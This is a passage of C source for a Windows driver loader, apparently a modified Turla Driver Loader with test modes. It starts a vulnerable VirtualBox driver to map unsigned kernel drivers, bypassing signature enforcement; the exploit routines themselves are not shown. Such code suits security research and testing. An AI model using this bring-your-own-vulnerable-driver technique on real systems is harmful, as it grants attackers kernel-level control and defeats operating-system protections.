{
    ULONG  c = 0;

    GetCommandLineParam(lpCommandLine, index, (LPWSTR)buf, bufSize - 1, &c);
    if (c == 0)
    {
        cuiPrintText(g_ConOut, 
            T_LOADERUSAGE,
            g_ConsoleOutput, FALSE);
        return FALSE;
    }
    return TRUE;
}

/*
* TDLProcessCommandLine
*
* Purpose:
*
* gets cmd parameters, prepare driver names and proceeds to loading
*
*/
UINT TDLProcessCommandLine(
    _In_ LPWSTR lpCommandLine
)
{
    UINT retVal = (UINT)-1;
    WCHAR szInputFile[MAX_PATH + 1];
    WCHAR szInputMode[MAX_PATH + 1];
    RtlSecureZeroMemory(szInputMode, sizeof(szInputMode));
    RtlSecureZeroMemory(szInputFile, sizeof(szInputFile));
    BOOL installAdditionalTestHonestly = FALSE;

    if (!GetTextParameter(lpCommandLine, 1, szInputMode, MAX_PATH))
    {
        return retVal;
    }

    if (wcscmp(szInputMode, TEXT("original")) == 0)
    {
        if (!GetTextParameter(lpCommandLine, 2, szInputFile, MAX_PATH))
        {
            return retVal;
        }
    }
    else if (wcscmp(szInputMode, TEXT("dummy")) == 0
        || wcscmp(szInputMode, TEXT("openregistry")) == 0
        || wcscmp(szInputMode, TEXT("openfile")) == 0
        || wcscmp(szInputMode, TEXT("openfile")) == 0
        || wcscmp(szInputMode, TEXT("createthread")) == 0
        || wcscmp(szInputMode, TEXT("loadimage")) == 0)
    {
        _strcat(szInputFile, TEXT("dummy"));
        if (wcscmp(szInputMode, TEXT("dummy")) != 0)
        {
            _strcat(szInputFile, TEXT("_"));
            _strcat(szInputFile, szInputMode);
        }
        _strcat(szInputFile, TEXT(".sys"));
        if (wcscmp(szInputMode, TEXT("loadimage")) == 0)
        {
            installAdditionalTestHonestly = TRUE;
        }
        if (!ExtractBinResource(szInputMode, szInputFile)
            && !PathFileExists(szInputFile))
        {
            cuiPrintText(g_ConOut, TEXT("Preparation: Cannot extract driver from resources."), g_ConsoleOutput, FALSE);
            return retVal;
        }
    }
    else
    {
        cuiPrintText(g_ConOut,
            TEXT("Ldr: Unknown mode"),
            g_ConsoleOutput, FALSE);
        return retVal;
    }

    if (PathFileExists(szInputFile)) {
        
        //install test driver if required
        if (installAdditionalTestHonestly && !InstallHonestDriver())
        {
            return retVal;
        }

        g_hVBox = TDLStartVulnerableDriver();
        if (g_hVBox != INVALID_HANDLE_VALUE) 
        {
            retVal = TDLMapDriver(szInputFile);

            if (installAdditionalTestHonestly)
            {
                MessageBox(0, TEXT("Wait while dirver completes its test"), TEXT("Wait"), 0);
            }
            
            TDLStopVulnerableDriver();
        }
        
        //remove honest driver if required
        if (installAdditionalTestHonestly)
        {
            if (scmUnloadDeviceDriver(dummyDrvSvc))
            {
                cuiPrintText(g_ConOut, TEXT("Preparaion: Honest driver has been removed\n"), g_ConsoleOutput, FALSE);
            }
            else
            {
                cuiPrintText(g_ConOut, TEXT("Preparaion: Cannot remove honest driver\n"), g_ConsoleOutput, FALSE);
            }
            /*if (schSCManager)
            {
                RemoveTestDriver(schSCManager);
                CloseHandle(schSCManager);
                cuiPrintText(g_ConOut, TEXT("Preparaion: Test driver has been removed\n"), g_ConsoleOutput, FALSE);
            }*/
        }
     }
    else {
        cuiPrintText(g_ConOut,
            TEXT("Ldr: Input file not found"),
            g_ConsoleOutput, FALSE);
    }
    return retVal;
}

/*
* TDLMain
*
* Purpose:
*
* Loader main.
*
*/
void TDLMain()
{

    BOOL            cond = FALSE;
    UINT            uResult = 0;
    DWORD           dwTemp;
    LONG            x;
    OSVERSIONINFO   osv;
    WCHAR           text[256];

    __security_init_cookie();

    do {

        g_hInstance = GetModuleHandle(NULL);

        g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (g_ConOut == INVALID_HANDLE_VALUE) {
            uResult = (UINT)-1;
            break;
        }

        g_ConsoleOutput = TRUE;
        if (!GetConsoleMode(g_ConOut, &dwTemp)) {
            g_ConsoleOutput = FALSE;
        }

        SetConsoleTitle(T_LOADERTITLE);
        SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);
        if (g_ConsoleOutput == FALSE) {
            WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &dwTemp, NULL);
        }

        cuiPrintText(g_ConOut,
            T_LOADERINTRO,
            g_ConsoleOutput, TRUE);

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            cuiPrintText(g_ConOut,
                T_LOADERRUN,
                g_ConsoleOutput, FALSE);
            uResult = (UINT)-1;
            break;
        }

        //check version first
        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        if (osv.dwMajorVersion < 6) {
            cuiPrintText(g_ConOut,
                T_LOADERUNSUP,
                g_ConsoleOutput, FALSE);
            uResult = (UINT)-1;
            break;
        }

        g_NtBuildNumber = osv.dwBuildNumber;

        _strcpy(text, TEXT("Ldr: Windows v"));
        ultostr(osv.dwMajorVersion, _strend(text));
        _strcat(text, TEXT("."));
        ultostr(osv.dwMinorVersion, _strend(text));
        _strcat(text, TEXT(" build "));
        ultostr(osv.dwBuildNumber, _strend(text));
        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);

        //
        // If VirtualBox installed on the same machine warn user,
        // however this is unnecessary can lead to any conflicts.
        //
        g_VBoxInstalled = TDLVBoxInstalled();
        if (g_VBoxInstalled) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Warning, VirtualBox software installed, conflicts are possible"),
                g_ConsoleOutput, TRUE);
        }

        uResult = TDLProcessCommandLine(GetCommandLine());

    } while (cond);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(uResult);
}
